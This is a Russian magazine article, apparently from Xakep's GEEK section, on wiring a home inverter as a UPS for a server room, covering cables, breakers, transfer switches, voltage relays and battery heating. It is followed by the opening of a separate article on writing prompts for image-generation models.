                                                                           2В рассмотренном нами примере рекомендуется кабель сечением 10 мм
и двухполюсный автомат номиналом 40 А. Кабель может выдержать ток 70 А,
как уже отмечалось. Запас — дело хорошее, но  почти в два раза —
это перебор.
   Да, если у тебя маломощная  установка до 4 кВт на базе системы
на 24 В (или вообще зарядная станция), тебе подойдет кабель сечени‐
          2ем 2,5 мм — нет смысла переплачивать: быстрее сгорит инвертор, чем сам
кабель.
   Итак, мы определились с кабелем — это пятижильный медный ВВГ(нг)
или кабель ПВС нужной длины и нужного сечения. Кроме самого кабеля, тебе
понадобится крепеж для него. Подумай, как ты будешь монтировать кабель
к стене. Существует крепеж разного вида, а подбор зависит от различных
факторов, в том числе и от материала твоих стен. Для наружного монтажа
подойдут  накладные  скобки  нужного  диаметра — дешево и  сердито.
Для  внутреннего оптимальным и самым симпатичным вариантом будет
кабель‑канал. Также посмотри: возможно, кабель‑канал уже есть в твоем
плинтусе и ты сможешь использовать его — так ты максимально спрячешь
кабель от посторонних глаз, да еще и сэкономишь немного денег на покупке
кабель‑канала. Обладатели модных МДФ‑плинтусов сейчас кусают локти.


                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ

  ЗДОРОВОЕ ПИТАНИЕ
           КАК ПРАВИЛЬНО ПОДКЛЮЧИТЬ
       ИБП ДЛЯ ДОМАШНЕЙ СЕРВЕРНОЙ





АВТОМАТИЧЕСКИЕ ВЫКЛЮЧАТЕЛИ

Тебе понадобятся два двухполюсных автоматических выключателя (2P): один
будет стоять до инвертора, а второй — после него. Обойдутся они в копейки,
а дополнительные удобства гарантированы. Например, при использовании
переключателя АВР ты можешь выключить подачу с инвертора при работе
от сети — во время включения мощного потребителя, чтобы не допустить
отключения BMS (об этом позже). Автоматические выключатели 2P хороши
тем, что они разрывают не только фазу, но еще и ноль.
   Основная задача автоматического выключателя — это защита кабеля.
Не инвертора, не другого оборудования, а именно кабеля. Поэтому очень
важно правильно подобрать номинал автомата. Если номинал будет меньше,
чем проходимый ток (например, ты купил автомат на 16 А, а нагрузка, допус‐
тим, 4 кВт), автомат будет выключаться. В этом случае говорят, что «автомат
                                                           2выбивает». Наоборот, если у тебя кабель, допустим, 1,5 мм  , а ты установил
автомат на 25 А и нагрузка при этом 5 кВт, автомат не сработает, а кабель
будет греться. Так и до пожара недалеко.
   Вторая важная характеристика автоматического выключателя — тип рас‐
цепления. В наших целях подойдет B или C. При этом B предпочтительнее,
так как отработает такой автомат раньше, чем С. При небольшом превыше‐
нии номинального тока (до 13%) для типа расцепления С нормально, если
автомат не сработает в течение часа. То есть если у тебя автомат на 25 А,
а ток, скажем, 28 А (всего на 12% больше), то целый час твой кабель будет
греться. Что с ним случится за этот час — он просто нагреется или распла‐
вится, — зависит от качества самого кабеля (а если еще и представить, что
                                                                           2ты сэкономил и взял какой‑то некачественный кабель с сечением 2 мм
или меньше...). Поэтому я рекомендую характеристику B. Характеристика
С нужна только в случае, если есть прочный запас по самому кабелю. Нап‐
ример,  при  использовании   автомата  на  25  А  ты  используешь
                        2кабель 4 или даже 6 мм  . В этом случае от тока 28 А с твоим кабелем ничего
не случится.
   При выборе номинального тока можно привязываться к номинальному
току входного автомата. Если эта величина составляет 25 А, то в твоей сети
неоткуда взяться большему напряжению, следовательно, нет смысла ставить
автоматы на 32 или 40 А.
   Совсем другая ситуация может быть, если у тебя маломощная система
на 24 В. В этом случае твой инвертор в среднем может «отдать» 3 кВт, сле‐
довательно, до и после него нужно установить автоматы на 16 А, даже если
входящий автомат большего номинала.
   Остальные характеристики автомата, как и его производитель, не столь
важны. Выбирай на свой вкус и цвет. Если ты будешь устанавливать эти два
автомата в общий щиток, то покупай того же производителя, оборудование
которого ты уже используешь, — так требует внутренний перфекционист.


             INFO

                           Сколько  электроэнергии  потребляет инвертор?
                        Да, твой счет за электричество вырастет — такова
                       цена автономии. На сколько — зависит от того,
                         как часто отключают электричество, и от мощ‐
                        ности  твоего  инвертора. На  «холостом  ходу»
                       инвертор  (когда все нормально, электричество
                           есть,    аккумулятор    заряжен)    потребляет
                         от 20 до 50 Вт. Как правило, системы на 48 В пот‐
                         ребляют около 50 Вт, а 24 В — 20–30 Вт. Когда
                     же нужно зарядить аккумулятор, потребляемая
                        мощность устанавливается в настройках инверто‐
                          ра, исходя из емкости аккумулятора и скорости
                         заряда.  Например,  если  у  тебя  аккумулятор
                       на 100 А · ч, то для его почти полного заряда пот‐
                           ребуется около 3 ч при силе тока 30 А. За час
                        будет востребовано 24 В (или 48 В)  · 30 А =
                      720 либо 1440 Вт. То есть для полного заряда
                            аккумулятора  понадобится 2,16 или 4,32 кВт.
                      Это очень грубый и не совсем правильный рас‐
                            чет, но примерное представление у тебя есть —
                        десять раз выключили электричество, и аккумуля‐
                        тор   разрядился   полностью,   следовательно,
                       для его зарядки ты используешь 21 или 43 кВт.
                    Плюс холостой ход самого инвертора в сред‐
                     нем 30 Вт · ч, то есть еще 21 кВт. Итого за месяц
                           нужно будет переплатить от 42 до 64 кВт в таком
                         сценарии использования.



ЩИТОК ДЛЯ АВТОМАТОВ

Посчитаем количество мест для дополнительных гаджетов:
 • для двух двухполюсных автоматов четыре места;
 • для трехпозиционного переключателя два места или для АВР пять мест.

Другими словами, тебе понадобится от шести до девяти мест в твоем щитке.
Если достаточного количества мест нет, придется купить накладной (именно
накладной, ведь никто не хочет делать ремонт для монтажа щитка?) плас‐
тиковый щиток. Производитель значения не имеет, выбирай тот, который
тебе больше нравится визуально.
    Если щиток (вдруг) будет установлен на улице, нужно брать с пылевлагоза‐
щитой IP65. Но лично я сомневаюсь, что ты будешь устанавливать именно эти
автоматы на улице, хотя все зависит от конкретно твоего случая. В моем
как раз АВР находится в пылевлагозащищенном щитке на улице, поскольку
своими щелчками при переключении он может довести до инфаркта вполне
себе здорового человека.





               Накладной щиток неизвестного производителя

Если монтаж подразумевается все‑таки наружный, кроме надписи IP65, обра‐
ти внимание на надежные уплотнители, предназначенные защищать проводку
от влаги.
   Наконец‑то мы разобрались с мелочами и готовы приступить к самому
подключению.


«ВИЛКА СУИЦИДНИКА», ИЛИ КАК НЕ НУЖНО ДЕЛАТЬ

Кабель вилка — вилка, или в простонародье «вилка суицидника», знаком
пользователям генератора, а также всем, кто использует зарядные станции.
Это кабель, на обоих концах которого смонтирована обычная вилка.
    Если у тебя раньше был генератор (зарядная станция), есть вероятность,
что ты подключал его именно так. Допустим, отключили электричество, ты
обязательно идешь выключаешь входной автомат, далее запускаешь генера‐
тор, подключаешь один конец кабеля вилка — вилка к выходной розетке
генератора, а второй конец — в одну из розеток твоего помещения. Нап‐
ример, если у тебя есть наружная розетка, ты можешь подключить генератор
к ней. В результате электричество распространится на все помещение.
   Проблема в этой схеме заключается в человеческом факторе — ты
можешь забыть отключить входной автомат. Когда появится электричество,
только Вселенная знает, что у тебя сгорит. Может быть, даже все электроп‐
риборы, если вообще не загорится проводка. Со стопроцентной уверен‐
ностью могу сказать, что твоя EcoFlow испустит дух.
   Именно  поэтому  кабель  вилка —  вилка  использовать  не  нужно:
это небезопасно. Да и нам требуется не просто резервный источник, а имен‐
но ИБП — ты не успеешь так быстро проделать все эти манипуляции (вык‐
лючить входной автомат, включить вилку, исходящую от инвертора, в розетку),
чтобы твои компы не выключились.


ПОДКЛЮЧАЕМ МОЩНЫЙ ИНВЕРТОР

Подключение мощного инвертора — самая экономная процедура, поскольку,
кроме двух 2P-автоматов и кабеля (и некоторых мелочей вроде клемм), тебе
больше ничего не нужно. Попробую объяснить на пальцах. На рисунке ниже
изображена твоя проводка — как она есть сейчас. У тебя есть входной авто‐
мат (возможно, где‑то в общем щитке на лестничной клетке), после него —
счетчик, а от счетчика выходят два провода — фаза и ноль. Фаза может быть
коричневого или красного цвета, а ноль, как правило, синего. Эти два про‐
вода «приходят» в твое помещение (офис, квартиру) — в твой щиток, который
обычно устанавливается при входе в помещение, где‑то рядом с входной
дверью.





                          Схема однофазной сети

Инвертор устанавливается в разрыв участка кабеля между счетчиком и щит‐
ком. Ищешь, где в твой щиток входят фаза и ноль, перекусываешь эти про‐
вода (тебе понадобятся кусачки и тестер — на всякий случай) и реализуешь
схему, изображенную на следующей иллюстрации.





                        Схема установки инвертора

Итак, последовательность действий:
 1. Выключи входной автомат.
 2. Выключи сам инвертор, если ты его включил для проверки.
 3. Открой руководство и найди контакты AC IN и AC OUT. На следующем
   рисунке схематически изображен инвертор PowMr и расположение его
    контактов.
 4. К проводам, исходящим от счетчика, подключаешь первый 2P-автомат (к
   верхним клеммам). Надежно зафиксируй провода, чтобы они не бол‐
   тались.
 5. К нижним клеммам первого 2P-автомата подключаешь сам инвертор —
    к контактам AC IN. L — это фаза, N — это ноль. Не перепутай!
 6. Исходящие провода от контактов AC OUT нужно подключить к верхним
   контактам второго автомата 2P (можно и к нижним, как на схеме, но пра‐
   вильнее к верхним. Просто мне было удобнее рисовать схему, изобразив
   подключение к нижним контактам).
 7. Далее провода, исходящие от второго автомата, ты подключаешь к своему
    щитку внутри помещения.
 8. Убедись, что оба 2P-автомата выключены. Включи инвертор. Он запус‐
   тится от батареи.
 9. Включи второй 2P-автомат (от инвертора к щитку). В помещении должно
   появиться электричество от инвертора.
10. Включи входной автомат, после чего включи первый автомат (от счетчика
    к инвертору) — на экране инвертора ты должен увидеть значок линии
    электропередач, свидетельствующий о том, что инвертор «увидел» сеть.





                         Нижняя панель инвертора

Как соединять провода? Учитывая, что мы не профессиональные электрики
и надежную скрутку все равно не сделаем, проще всего использовать клеммы
Wago.





                  Клеммы Wago — тебе нужно две штуки

Обрати внимание, что клемма Wago на три провода. Не забывай о зазем‐
лении. На схеме подключения для простоты оно не изображено, но жел‐
то‑зеленый провод нужно подключить к клемме, помеченной соответству‐
ющим значком на инверторе! Некоторые устройства, например газовые кот‐
лы, могут не работать без подключенного заземления.


             EcoFlowПодключение
Если у тебя зарядная станция, то контакты AC OUT — это та самая выходная
розетка на зарядной станции, а AC IN — вилка, которой зарядная станция
подключается к сети. Но поскольку редкий EcoFlow может выдержать полную
нагрузку, лучше перейти к разделу «Подключение слабого инвертора».



             INFO

                            Если не удалось нормально зачистить кабель,
                           лучше перестраховаться и дополнительно заизо‐
                           лировать места соединения (вместе с клеммами)
                       синей (или черной — как тебе больше нравится)
                             изолентой. Изоленты много не бывает!


Описанный выше способ подходит для подключения мощного инвертора,
рассчитанного на максимальную мощность твоей линии. Допустим, у тебя
входной автомат на 25 А, следовательно, максимум, что ты можешь вытянуть
из сети, — 5,7 кВт (230 · 25). Чтобы покрыть всю эту мощность, тебе нужен
инвертор на 6 кВт или более мощный. Если ты купишь менее мощный
инвертор, то все будет работать до тех пор, пока один из твоих девайсов
не превысит мощность твоего инвертора. Например, если с использованием
этого способа ты подключил инвертор на 3 кВт, то, пока твоя потребляемая
мощность меньше 3 кВт, все будет работать. Если ты превысишь 3 кВт
и инвертор работает от сети, то он выдаст ошибку перегрузки (Overload),
а если он работает от аккумулятора, то защита на BMS сработает даже быс‐
трее, чем защита на инверторе, и просто отключит аккумулятор. Потом тебе
придется сбрасывать BMS, отключая контакты на плате (или использовать
другой способ, предоставленный производителем BMS).


                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ

  ЗДОРОВОЕ ПИТАНИЕ
           КАК ПРАВИЛЬНО ПОДКЛЮЧИТЬ
       ИБП ДЛЯ ДОМАШНЕЙ СЕРВЕРНОЙ





ПОДКЛЮЧЕНИЕ С ИСПОЛЬЗОВАНИЕМ ТРЕХПОЗИЦИОННОГО
ПЕРЕКЛЮЧАТЕЛЯ

Предыдущий вариант подключения считается стандартным. Но стандарт на то
и стандарт, что можно сделать лучше. В нашем случае — комфортнее.
А именно: в схему нужно добавить трехпозиционный переключатель.
   Трехпозиционный переключатель —  электромеханическое  коммутаци‐
онное устройство, используемое в электротехнике для переключения питания
на другую линию при перегрузке. Такой переключатель оснащен рукояткой,
которая позволяет размыкать и замыкать цепь в каждой из позиций. Среднее
положение обеспечивает размыкание всех групп  контактов. Управление
устройством выполняется вручную. Верхние контакты обычно используются
для подключения вводов, а нижние — для подключения нагрузки.
   Обрати внимание: это не автомат, это просто устройство для замыкания
контактов. Схема его подключения изображена на рисунке ниже. Провода,
исходящие от клемм AC OUT инвертора, тебе надо подключить к нужным кон‐
тактам трехпозиционного переключателя, также к нему подключаешь питание
от сети. К «выходу» из переключателя подключаешь свой щиток.





           Схема подключения трехпозиционного переключателя

Схема очень проста, само устройство стоит недорого (в среднем две‑три
тысячи рублей), зато оно добавит тебе дополнительного комфорта. Пред‐
ставь, что инвертор выйдет из строя. Тогда ты, пока не переподключишь
щиток, будешь сидеть без света, так как у тебя все помещение было запитано
от инвертора. Или представь, что у тебя частный дом и тебе нужно подклю‐
чить сварочный аппарат или другую ощутимую нагрузку. Как‑то не хочется
пропускать такую нагрузку через инвертор, хочется его поберечь. Поэтому ты
переводишь в обоих этих случаях переключатель в положение «Сеть» (это
может быть как верхнее, так и нижнее — смотря как ты подключишь) и твой
дом питается от сети. В среднем положении любой из источников отключен
и твое помещение обесточено, что позволяет тебе производить ремонтные
работы.


ПОДКЛЮЧЕНИЕ СЛАБОГО ИНВЕРТОРА. АВТОМАТ ВВОДА РЕЗЕРВА

Все немного усложняется, если инвертор у тебя слабый. Допустим, ты купил
инвертор 24 В на 3 кВт и установил его у себя в квартире. Все работает прек‐
расно: твои компы, ТВ, приставка, холодильник и, может быть, даже кондици‐
онер, особенно если он инверторный. Но вечером включенная электродухов‐
ка нарушила твой идеальный мир — произошло превышение по току разряда,
и BMS выключила аккумулятор. Свет потух. Даже при работе от сети ты оста‐
нешься без света, а единственное, что будет светиться, — экран самого
инвертора с ошибкой Overload.
   Поэтому существуют три способа подключения слабого инвертора:
 • Через АВР (автомат ввода резерва) — это устройство автоматически
   переключает источники питания. Приоритет за сетью. Есть сеть — мы
   работаем от сети. Нет сети — АВР переключает на инвертор.
 • Через  трехпозиционный  переключатель,  когда ты сам  определяешь,
   от какого источника будешь работать. Вечером, когда нужно включить
    электродуховку, ты принудительно переключаешься на сеть. Проблема
   в том, что ты обязательно попадешь в среднее положение и на несколько
   секунд свет потухнет (вместе с твоими компами, а этого бы не хотелось).
 • Подключение инвертора к выделенному автомату. Например, компы уста‐
   новлены в твоей комнате, и, если для нее есть отдельный автомат, ты
  можешь подключить инвертор к нему. То есть не на весь дом, а только
   к отдельной линии.

У каждого способа свои достоинства и недостатки. Начнем с первого. Если
есть электричество, ты всегда будешь работать от городской сети и можешь
включать самые мощные потребители. Единственным ограничением будет
входной автомат и твой кабель, который может сгореть, если этот входной
автомат выбран неверно. Если же городская сеть отсутствует, тогда ты сам
станешь ограничивать себя — не будешь включать мощные потребители.
Как ты узнаешь, что сети нет? Если ты не пожадничал и купил Wi-Fi-адаптер —
через мобильное приложение инвертора. Если ты Скрудж, тогда — на экране
инвертора (см. рисунок ниже). Если отсутствует линия электропередач, зна‐
чит, городская сеть «умерла».





                           Типичный экран инвертора

К такому режиму привыкнуть несложно. Проблема возникнет только в одном
случае: ты запускаешь духовку и через некоторое время отключают свет. АВР
«видит», что есть резервный источник, переключается на него, и твой
маломощный инвертор ловит сразу Overload (или он, или BMS, ставлю на то,
что BMS отработает быстрее). Гаснет свет. Занавес.
   Чтобы такого не произошло, перед включением мощного потребителя
при работе от сети желательно выключить второй автомат (от инвертора
к дому). Тогда, если погаснет свет, напряжение в сети пропадет, ты вык‐
лючишь мощный потребитель и включишь второй автомат — свет появится.
Смысл этого маразматического действия в том, что перегрузку не словит
BMS и тебе не  придется  выполнять  танцы с  бубном,  чтобы  вывести
это устройство из аварийного режима.
   Второй недостаток АВР в том, что при автоматическом переключении кон‐
тактов происходит довольно ощутимый щелчок. Днем с этим еще можно
мириться, а вот ночью будет напрягать. Победить это можно, только если
есть возможность установить АВР за пределами помещения, например
в щитке на лестничной клетке или в наружном щите (если у тебя дом).
   Преимущества АВР проявляются, если свет у тебя отключают по графику.
Каждые несколько часов тебе не придется переключать источники вручную —
все будет делать автоматика. Только помни, что у автоматики есть ресурс —
около 2000 переключений туда‑сюда, так что АВР лучше покупать сразу два,
чтобы оперативно подключить новый, если предыдущий откажется работать.
   Также АВР предлагает возможность ручного переключения. Для этого
переведи его в режим Manual и с помощью  рукоятки выбери нужный
источник.
   Если тебя интересует мое мнение, то мой выбор — АВР. Пусть это и
неидеальное решение. Идеальное — установка мощного инвертора с трех‐
позиционным переключателем. Но, как пользователь слабого инвертора, ска‐
жу, что с ним тоже можно жить. Как подключить АВР, будет показано позже,
а пока рассмотрим оставшиеся два варианта.
   Трехпозиционный переключатель в случае с маломощным инвертором —
не очень хорошая затея, поскольку переключаться туда‑сюда придется вруч‐
ную. Исключение — если ты очень редко выходишь за пределы нагрузки 3 кВт
и можешь себе позволить, допустим, раз в неделю выключить оборудование,
чтобы включить что‑то мощное. Однако такой способ часто используют
при подключении EcoFlow. Здесь отрезается вилка, которой EcoFlow подклю‐
чалась к сети 220, и этот кабель превращается в контакты AC IN. Потом изго‐
тавливается кабель с вилкой и подключается к выходной розетке зарядной
станции. Его концы становятся контактами AC OUT. Теоретически, если ты
готов мириться с громкими автоматическими переключениями АВР, можно
его использовать и в квартире в паре с EcoFlow. Главное — выбрать мощную
версию зарядной станции (хотя бы на 2 кВт), чтобы ее мощности хватило
на большинство потребителей.
   Подключение  инвертора  только  к выделенным  линиям —  неплохое
решение. Если не считать твои компы, то самым затратным местом в доме
с  точки зрения потребления  электричества является  кухня. Именно там
находятся самые мощные электроприборы. Ты можешь выбрать приоритет‐
ные линии и запитать их через инвертор, например освещение, розетку,
к которой подключаются твои серверы, возможно — холодильник. Остальное
при отключении света работать не будет. Зато так ты точно можешь быть уве‐
рен, что к твоему инвертору не придет Overload. Недостаток у этого способа
всего один — он не всегда возможен. Если проводка проектировалась пра‐
вильно, то все в порядке. Если же у тебя два автомата (один для света, другой
для розетки), то, увы, использовать этот способ невозможно. Здесь все инди‐
видуально.
   Выбор способа подключения слабенького инвертора оставлю за тобой,
а далее мы рассмотрим возможности и подключение АВР. Начнем с выбора
этого устройства.
  АВР можно купить на всем известном  сайте по запросу Dual-Power
Automatic Transfer Switch. Производителей много, но что‑то мне подсказыва‐
ет, что все АВР делаются на одном заводе, просто имеют разные надписи
и цвет корпуса. Тебе нужна «коробочка», на которой:
 • написано «125 А» — ты никогда не превысишь это напряжение, но такие
  АВР имеют дугогасительную камеру и более мощные контакты. Это очень
   важно;
 • изображен генератор, а не солнечные панели. Версия с солнечными
   панелями работает не так, как нам нужно, — источник с панелями имеет
   высший приоритет, нежели сеть. Чтобы все работало, тебе придется под‐
   ключить инвертор как сеть, а сеть как солнечные панели, что будет сбивать
   с толку. Зачем так усложнять, если есть правильная версия — с генера‐
   тором.

Также  нужно  выбирать  однофазный  вариант,  который  можно  узнать
по количеству входных контактов — их будет всего два: фаза и ноль. А трех‐
фазный вариант имеет три контакта — L1, L2, L3.
  На следующем рисунке изображен тот вариант, который тебе нужен. Он
однофазный и с генератором. Обрати внимание, что он на 100 А, а не
на 125 А, — фото такого АВР в хорошем качестве я не нашел.





                                 Типичный АВР

Производитель может быть любым, все подобные  устройства  выглядят
и работают одинаково. У тебя есть переключатель Manual и Auto, а также
рукоятка выбора источника. Обрати внимание: переключать источники вруч‐
ную можно только в режиме Manual. То есть сначала переводим девайс
в режим Manual, а потом уже вращаем рукоятку!
   Диоды напротив А и B будут светиться, если доступен тот или иной
источник. Например, если источник А (сеть) недоступен, то этот диод светить‐
ся не будет.
   Подключение АВР  сложнее, чем  обычного  трехпозиционного  перек‐
лючателя.





                         Схема подключения АВР

Сверху ты подключаешь фазу и ноль (не перепутай), идущие от счетчика. Сни‐
зу нужно подключить провода, идущие от контактов AC OUT инвертора (тоже
не перепутай фазу и ноль). R — это фаза, N — это ноль. Все бы хорошо,
но для того, чтобы работала автоматика, тебе нужно подключить управля‐
ющие линии. Для подключения управляющих линий хватит кабеля с неболь‐
                               2шим сечением — хоть 0,75 мм  . Не нужно пытаться в тонкие клеммы запих‐
                2нуть кабель 4 мм  .
   Принцип следующий: если ты не подключишь управляющие линии, то ока‐
жется возможно только ручное переключение. Автоматика работать не будет,
поскольку плата АВР не «увидит», что на том или ином источнике есть нап‐
ряжение.
   Какие провода куда  подключать — понятно по  схеме. Фазу и ноль
от городской сети соединяем с клеммами AR и AN (все просто: A —
это источник, R — фаза, N — ноль), а фазу и ноль от инвертора — с клеммами
BR и BN соответственно.
   Если автоматика не работает, тому может быть три причины:
 • устройство в режиме Manual;
 • плохой контакт на клеммах AR, AN, BR, BN;
 • устройство требует замены.



                                     Продолжение статьи →
GEEK                ← НАЧАЛО СТАТЬИ

  ЗДОРОВОЕ ПИТАНИЕ
           КАК ПРАВИЛЬНО ПОДКЛЮЧИТЬ
       ИБП ДЛЯ ДОМАШНЕЙ СЕРВЕРНОЙ





ПРАВИЛЬНОЕ ПОДКЛЮЧЕНИЕ РЕЛЕ НАПРЯЖЕНИЯ
(ДО ИНВЕРТОРА)

Реле напряжения — это полезный девайс, отключающий нагрузку, если нап‐
ряжение выйдет за безопасный диапазон (190–240 В, хотя у тебя в настрой‐
ках может быть указан другой). Однако при установке инвертора возникает
нюанс с этим реле.
   Переключение на батарею (или с одного источника на другой) происходит
практически молниеносно и обычно длится не больше 10–30 мс. У тебя
в идеале даже не успеет моргнуть лампочка, то есть, с точки зрения как пот‐
ребителя, так и устройств, никто не заметит смену источника. Никто, кроме
реле. Реле напряжения довольно чувствительные девайсы, и они успевают
зарегистрировать падение (просадку) напряжения. А что делает реле, когда
оно обнаруживает выход напряжения за допустимый диапазон? Правильно,
оно отключает нагрузку, затем, когда напряжение появляется, выжидает уста‐
новленное в настройках время и включает нагрузку.
   Теперь моделируем ситуацию. Пропало электричество, произошло перек‐
лючение на инвертор, на долю секунду в сети просело напряжение. Реле вык‐
лючает нагрузку, то есть весь твой щиток внутри дома, квартиры или офиса.
Реле сразу видит, что напряжение уже есть (ведь оно пошло от инвертора),
и ждет установленное в настройках время (обычно от 30 с), затем включает
нагрузку. Другими словами, ИБП в случае с установленным реле напряжения
работать не будет, так как «свет» потухнет минимум на 30 с.
  А вот способы решения ситуации.
 • Установка реле  напряжения до  инвертора  (на  отрезке  счетчик —
   инвертор). Обычно реле устанавливается на входе в щиток. В этом случае
   оно будет регистрировать просадку напряжения и при этом твой инвертор
   не будет защищен от скачков напряжения, поскольку реле его не защища‐
   ет. А вот если установить его до инвертора, то оно будет защищать твой
   инвертор  и  все  остальные  устройства.  Если  напряжение  выйдет
   за безопасный диапазон, реле отключит нагрузку и инвертор переключит‐
   ся на батарею. Напряжение, поступающее с инвертора, обычно более ста‐
   бильно, чем напряжение в городской сети, поэтому твоя техника только
   скажет тебе спасибо. Если напряжение скачет туда‑сюда, то с твоим
   инвертором ничего не случится — учитывая, что реле ждет минимум 30 с,
   такие вот переключения с сети на АКБ инвертору не навредят.
 • Установка ограничителя напряжения вместо реле напряжения. В этом слу‐
   чае нагрузка отключится только в случае выхода напряжения за верхнюю
   границу (обычно 275 В). Нижней границы нет. Это решит проблему с про‐
   садкой напряжения при смене источника и спасет твою технику, если нап‐
   ряжение будет выше 275 В. Но это не спасет твой инвертор, да и если
  ОПН (ограничитель перенапряжений нелинейный) выключит твою наг‐
   рузку, включать придется вручную. Так что это такой себе вариант, ставить
   на замену реле напряжения я бы его не стал.


             INFO

                           Некоторые стабилизаторы, особенно те, которые
                               ставятся на все помещение, не всегда корректно
                         работают с инвертором. Они могут вести себя,
                         как реле напряжения, вот только переподключить
                      не всегда выйдет, поскольку некоторые инверто‐
                    ры не смогут работать, если перед ними подклю‐
                       чен  стабилизатор.  Здесь  все  индивидуально
                      и познается практическим путем. В крайнем слу‐
                        чае всегда можно продать стабилизатор и купить
                         инверторный, но приготовься к тому, что он стоит
                          довольно дорого.



ЭКОНОМИЯ ЭЛЕКТРИЧЕСТВА

С помощью инвертора можно экономить. Конечно, экономия выйдет сом‐
нительная, учитывая износ АКБ, однако можно не только увеличить, но и
уменьшить счет за электроэнергию. Некоторые инверторы позволяют выб‐
рать, когда их следует заряжать, — настройка называется Time of use. В этом
случае, если у тебя двухтарифный счетчик, ты можешь заряжать аккумулятор
ночью по льготному тарифу, а днем ты будешь работать от аккумулятора.
Но здесь тебе придется изначально потратиться — тебе нужен мощный
инвертор, который смог бы перекрыть все твое возможное потребление,
и несколько аккумуляторов, позволяющих продержаться 18 ч (как правило,
льготный тариф всего 6 ч — с 00 до 06).
  На следующем рисунке показано, что инвертор будет заряжаться только
с 00:04 до 06:00, при этом максимальный уровень заряда, до которого можно
заряжать батарею, — 50% (хотя, если хочешь экономить, лучше заряжать
до 100%, но если у тебя есть солнечные панели, то ночью можно заряжать
до 50%, а днем АКБ будет заряжаться от солнца). Максимальное нап‐
ряжение — 4500 Вт (если всего 5 кВт, то есть смысл не использовать всю
мощность, оставив немного для другой техники).





                 Настройка рабочего режима инвертора Deye


ИНВЕРТОР «НЕ ВИДИТ» СЕТЬ

Теперь немного практического опыта, о котором ты не прочитаешь в мануале.
Появилась сеть, инвертор «нарисовал» линию электропередач на своем дис‐
плее, но значок ЛЭП моргает, а от нее не прорисована линия ни к аккумуля‐
тору, ни к дому. На некоторых китайских инверторах встречается такой вот
глюк ПО. Вылечить это можно, если в меню изменить параметр 03 (AC input
voltage range) с UPS на APL, что гарантирует работу инвертора при нап‐
ряжении от 90 до 280 В.
   Режим UPS будет работать при напряжении 170–280 В, но, как показывает
практика, даже при более высоком напряжении, например 190 В, режим UPS
не работает и инвертор «не видит» сеть, не заряжает АКБ, а вся система
работает от того, что осталось в АКБ. Переключение на режим APL позволяет
решить эту проблему. Причем если после того, как «сеть увидели», перек‐
лючиться в режим UPS, все будет работать нормально.





                       Выбор значения опции 03


КОНТРОЛИРУЙ ТЕМПЕРАТУРНЫЙ РЕЖИМ

Если инвертор установлен в неотапливаемом помещении, например в под‐
вале или  подсобке,  важно  контролировать температурный режим. Хотя
на самом инверторе и написано, что он может работать до –10 °C, заряжать
литиевые батареи при температуре ниже ноля крайне не рекомендуется.
В ПО BMS можно просмотреть текущую температуру окружающей среды —
на следующем рисунке она –2 °С.





                   Неподходящий температурный режим

Зарядка литиевой батареи при отрицательной температуре снижает срок ее
эксплуатации. Поэтому нужно подумать, как отапливать (хотя бы до ноля)
помещение. Самое простое — это использование простейшего обогревате‐
ля и термореле.





                          Термореле в розетку

Подключаешь его в розетку, а в розетку терморегулятора — какой‑нибудь
обогреватель. Устанавливаешь пределы температуры,  когда нужно реле
включить и когда выключить. Собственно, на этом все. Можно придумать ана‐
логичное решение со смарт‑розеткой и датчиками температуры, работающее
на базе Tuya Smart Life, но зачем усложнять, если есть такая вот штуковина?
   Можно заморочиться с каким‑то специальным корпусом для батареи
с  использованием  нагревающего кабеля (который  монтируют в  теплых
полах), но это если у тебя есть время и желание. Обычно такой терморегу‐
лятор отлично справляется с поставленными задачами.
   Надеюсь, я в полной мере раскрыл процесс подключения резервного
питания и помог тебе самостоятельно  справиться с  установкой «упса»
для твоего дома.
GEEK





Лучший  способ  создать  изображение,
на котором  есть  нужные  тебе  объекты
в нужной стилистике, — посмотреть при‐
меры на одном из крупных порталов и ско‐
пировать   текстовый   запрос,   отредак‐          Олег Афонин                                                                                      Эксперт по мобильной
тировав  его  в  требуемом  направлении.       криминалистике компании                                                                                         «Элкомсофт»
Или нет? Практика показывает, что многие        aoleg@voicecallcentral.com
пользователи бездумно копируют запросы,
буквально захламленные бессмысленными
токенами.


Сегодняшняя тема — одна из самых важных в серии статей о генеративном
искусственном интеллекте: мы будем составлять запросы, и делать это пос‐
тараемся правильно.


КАК ПОЯВИЛАСЬ ЭТА СТАТЬЯ

Как‑то  раз  я  помогал  сгенерировать  обложку  для  книги.  У  коллеги
не задалось, а когда я попросил прислать запрос, увидел вот это:

     A dynamic action shot captures a volleyball player in mid-air as she strikes
       the ball with her right hand, while wearing a forest green jersey with white«
      and black accents, bearing the number 8. The player’s blonde hair is tied
      back in a ponytail, and her face shows intense focus on the task at hand.
      Her left arm is supported by a white sleeve or pad around the elbow. She
      wears knee-high white leg warmers and pink volleyball shoes with light
       blue soles. The  volleyball, with  its  distinctive yellow  exterior and blue
       sections divided by vertical ribbons, is held high above her head. In the
       foreground, two opposing players are attempting to block the serve; one
         is seen from behind with arms fully extended upwards, while another with
       the has both hands raised high, fingers spread wide. Both opponents wear
       dark jerseys with intricate red, white, and black patterns. They also have
       black arm sleeves, with sleeve showcasing a vibrant blue and pink pattern.
      Both  players  have  their heads  turned  slightly  towards  the  camera,
       revealing  part  of  their  faces. The  net,  spanning  horizontally  across
       the middle of the frame, features a white mesh structure with black lines
       forming a square  grid  pattern. The  floor beneath them  is  teal  blue,
       contrasting sharply with the orange area where the players are standing.
      The overall lighting is bright and even, typical of an indoor sports arena,
        highlighting the athleticism and competitive nature of the moment.                »
Честно говоря, понять, чего хочет вопрошающий, я не смог; мне пришлось
прибегнуть к помощи ChatGPT, чтобы тот расшифровал запрос. Текстовые
декодеры генеративных моделей ИИ далеко не так продвинуты, и нет ничего
удивительного в том, что корректно обработать такой запрос они не смогли.
Я же решил написать статью, которая, возможно, удержит тебя от изде‐
вательств над искусственным интеллектом.


КОГО БУДЕМ СПРАШИВАТЬ?

Правила  составления  запросов  разительно  отличаются  в  зависимости
от архитектуры модели и используемых в ней текстовых декодеров, а син‐
таксис — в зависимости от используемого для генерации софта. К примеру,
модели на основе Flux лучше всего работают с текстовыми запросами, сос‐
тавленными  другим  искусственным  интеллектом —  большой  языковой
моделью (например, ChatGPT). Языковые модели умеют правильно струк‐
турировать запрос, в результате чего картинка получается более детальной
и когерентной по сравнению с короткими запросами, составленными по пра‐
вилам моделей SDXL.
